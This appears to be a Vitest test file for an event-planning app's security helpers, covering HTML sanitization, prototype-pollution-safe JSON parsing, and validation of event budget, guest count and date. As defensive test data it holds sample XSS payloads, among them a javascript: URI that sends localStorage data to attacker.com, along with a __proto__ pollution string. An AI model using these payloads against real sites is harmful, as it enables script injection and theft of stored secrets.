import { describe, it, expect } from 'vitest';
import { sanitizeString, safeJSONParse, validateEventConstraints } from '../utils/security';

describe('Security & Input Sanitization Suite', () => {
  describe('sanitizeString', () => {
    it('strips <script> tags and inner script content', () => {
      const malicious = '<script>alert("pwned")</script>Sharma Wedding';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('Sharma Wedding');
    });

    it('strips inline JavaScript event handlers (onerror, onload, onclick)', () => {
      const malicious = '<img src="x" onerror="alert(1)">Anniversary';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('onerror');
      expect(clean).toContain('Anniversary');
    });

    it('strips javascript: protocol URI schemes', () => {
      const malicious =
        'javascript:fetch("https://attacker.com/steal?k=" + localStorage.getItem("key"))';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('javascript:');
    });

    it('strips iframe, embed, and object tags', () => {
      const malicious =
        '<iframe src="https://evil.com"></iframe><embed src="x"><object data="y"></object>Birthday';
      const clean = sanitizeString(malicious);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<embed');
      expect(clean).not.toContain('<object');
      expect(clean).toContain('Birthday');
    });

    it('encodes special HTML characters into safe entities', () => {
      const input = 'Dinner & Cocktails <VIP "Quote" \'Special\'>';
      const clean = sanitizeString(input);
      expect(clean).toContain('&amp;');
      expect(clean).toContain('&lt;');
      expect(clean).toContain('&gt;');
      expect(clean).toContain('&quot;');
    });

    it('enforces maximum character bounds to mitigate buffer/DoS vectors', () => {
      const longInput = 'A'.repeat(1000);
      const clean = sanitizeString(longInput, 150);
      expect(clean.length).toBeLessThanOrEqual(150);
    });

    it('handles null, undefined, and non-string inputs gracefully', () => {
      expect(sanitizeString(null as unknown as string)).toBe('');
      expect(sanitizeString(undefined as unknown as string)).toBe('');
      expect(sanitizeString(12345 as unknown as string)).toBe('');
    });
  });

  describe('safeJSONParse & Prototype Pollution Defense', () => {
    it('parses valid JSON successfully', () => {
      const json = JSON.stringify({ event: 'Gala', budget: 500000 });
      const parsed = safeJSONParse(json, { event: '', budget: 0 });
      expect(parsed.event).toBe('Gala');
      expect(parsed.budget).toBe(500000);
    });

    it('strips prototype pollution vectors (__proto__, constructor)', () => {
      const maliciousJSON = '{"__proto__": {"admin": true}, "title": "Celebration"}';
      const parsed = safeJSONParse<{ title: string; admin?: boolean }>(maliciousJSON, {
        title: '',
      });
      expect(parsed.title).toBe('Celebration');
      // Root object prototype must not be polluted
      expect(({} as { admin?: boolean }).admin).toBeUndefined();
    });

    it('returns fallback value on invalid JSON syntax without throwing', () => {
      const malformed = '{ invalid json payload ...';
      const fallback = { fallback: true };
      const result = safeJSONParse(malformed, fallback);
      expect(result).toEqual(fallback);
    });
  });

  describe('validateEventConstraints', () => {
    it('approves realistic event parameters', () => {
      const res = validateEventConstraints(800000, 200, '2026-11-20');
      expect(res.isValid).toBe(true);
      expect(res.errors).toHaveLength(0);
    });

    it('rejects sub-minimum budget', () => {
      const res = validateEventConstraints(200, 50, '2026-11-20');
      expect(res.isValid).toBe(false);
      expect(res.errors[0]).toContain('at least 5,000');
    });

    it('rejects astronomical budget overflow', () => {
      const res = validateEventConstraints(2000000000, 50, '2026-11-20');
      expect(res.isValid).toBe(false);
      expect(res.errors[0]).toContain('exceeds maximum allowed');
    });

    it('rejects invalid guest counts (zero or negative)', () => {
      const res = validateEventConstraints(50000, 0, '2026-11-20');
      expect(res.isValid).toBe(false);
      expect(res.errors[0]).toContain('at least 1 attendee');
    });

    it('rejects invalid target dates', () => {
      const res = validateEventConstraints(50000, 50, 'not-a-date');
      expect(res.isValid).toBe(false);
      expect(res.errors[0]).toContain('valid calendar date');
    });
  });
});
